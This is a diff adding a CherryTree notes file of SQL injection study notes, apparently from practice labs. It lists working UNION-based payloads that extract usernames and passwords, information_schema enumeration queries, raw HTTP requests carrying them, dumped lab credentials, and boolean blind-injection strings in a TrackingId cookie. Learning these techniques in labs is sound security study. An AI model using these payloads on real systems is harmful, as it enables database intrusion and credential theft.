@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="SQL Injection" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1715349439" ts_lastsave="1715393671">
+    <rich_text>Union attack, 
+
+
+using concatnation with || 
+	for ex:
+	</rich_text>
+    <rich_text family="monospace">' UNION SELECT username || '~' || password FROM users--</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text family="monospace">..
+		administrator~s3cure
+		wiener~peter
+		carlos~montoya</rich_text>
+    <rich_text>
+		..
+GET /filter?category='+UNION+SELECT+null,username||'~'||password+FROM+users-- HTTP/2
+
+</rich_text>
+    <rich_text family="monospace">'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text family="monospace">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text family="monospace">'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</rich_text>
+    <rich_text>
+
+GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='§user_defined_types§'-- HTTP/2
+
+GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_uizetg'-- HTTP/2
+GET /filter?category='+UNION+SELECT+username_lisnmy,+password_wehcng+FROM+users_uizetg-- HTTP/2
+
+Conditional responses - the sql injection from path is not available, using another attribute instead:
+ex: using tracking id in session cookie.
+
+</rich_text>
+    <rich_text family="monospace">TrackingId=xyz' AND '1'='1</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text family="monospace">TrackingId=xyz' AND '1'='2</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text family="monospace">TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</rich_text>
+  </node>
+</cherrytree>
